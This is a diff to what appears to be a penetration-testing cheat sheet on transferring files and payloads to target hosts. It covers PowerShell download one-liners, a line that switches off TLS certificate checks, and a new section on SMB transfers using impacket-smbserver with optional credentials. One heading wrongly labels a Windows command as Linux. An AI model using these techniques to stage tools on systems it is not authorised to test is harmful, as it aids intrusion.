@@ -16,12 +16,12 @@ In the profane rites of assessment, the movement of relics—scripts, payloads, 
 
   Sync  
   ```powershell
-  (New-Object Net.WebClient).DownloadFile('<FILE URL>','<OUTPUT FILE NAME>')
+  (New-Object Net.WebClient).DownloadFile('<FILE URL>','<OUTPUT FILE>')
   ```
 
   Async  
   ```powershell
-  (New-Object Net.WebClient).DownloadFileAsync('<FILE URL>','<OUTPUT FILE NAME>')
+  (New-Object Net.WebClient).DownloadFileAsync('<FILE URL>','<OUTPUT FILE>')
   ```
   </details>
 
@@ -44,7 +44,7 @@ In the profane rites of assessment, the movement of relics—scripts, payloads, 
 
   Base  
   ```powershell
-  Invoke-WebRequest <FILE URL> -OutFile <OUTPUT FILE NAME>
+  Invoke-WebRequest <FILE URL> -OutFile <OUTPUT FILE>
   ```
 
   ByPass Internet Explorer Error  
@@ -56,6 +56,34 @@ In the profane rites of assessment, the movement of relics—scripts, payloads, 
   ```powershell
   [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
   # Command to download the file
+  ```
+
+  </details>
+
+  <details>
+    <summary><strong>SMB Downloads</strong></summary>
+
+  **Base form**
+  
+  Create the SMB Server in Linux
+  ```bash
+  sudo impacket-smbserver share -smb2support /tmp/smbshare
+  ```
+  Download using CMD in Windows
+  ```cmd
+  copy \\<IP>\share\<FILE>
+  ```
+  
+  **Using credentialts**
+
+  Create the SMB Server in Linux
+  ```bash
+  sudo impacket-smbserver share -smb2support /tmp/smbshare -user <USER> -password <PASSWORD>
+  ```
+  Mount the SMB Server in Linux
+  ```cmd
+  net use n: \\<IP>\share /user:<USER> <PASSWORD>
+  copy n:\<FILE>
   ```
 
   </details>
